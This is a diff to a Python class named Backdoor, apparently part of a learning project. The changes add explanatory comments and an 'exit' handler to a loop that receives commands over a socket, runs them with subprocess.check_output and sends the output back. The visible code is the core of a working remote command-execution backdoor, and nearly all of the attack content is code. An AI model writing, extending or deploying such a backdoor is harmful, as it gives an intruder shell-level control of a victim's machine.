@@ -7,7 +7,7 @@ class Backdoor:
     def reliable_send(self,data):#use instead of socket send method for everytime we need to send data 
         json_data=json.dumps(data)#convert to json
         self.connection.send(json_data)   
-    def reliable_receive(self):
+    def reliable_receive(self):#best implementation look serialisation once.value error is due to receiving and unpacking incomplete data
         json_data=""
         while True:
             try:
@@ -19,7 +19,10 @@ class Backdoor:
         return subprocess.check_output(command)
     def run(self):
         while True:
-            command=self.reliable_receive() 
+            command=self.reliable_receive() #we receive data in form of list and it will execute command without converting to string because check_output of subprocess execute both string as well as list data
+            if command[0]=="exit":
+                self.connection.close()
+                exit()
             command_result=self.execute_system_command(command) 
             self.reliable_send(command_result)
         self.connection.close()
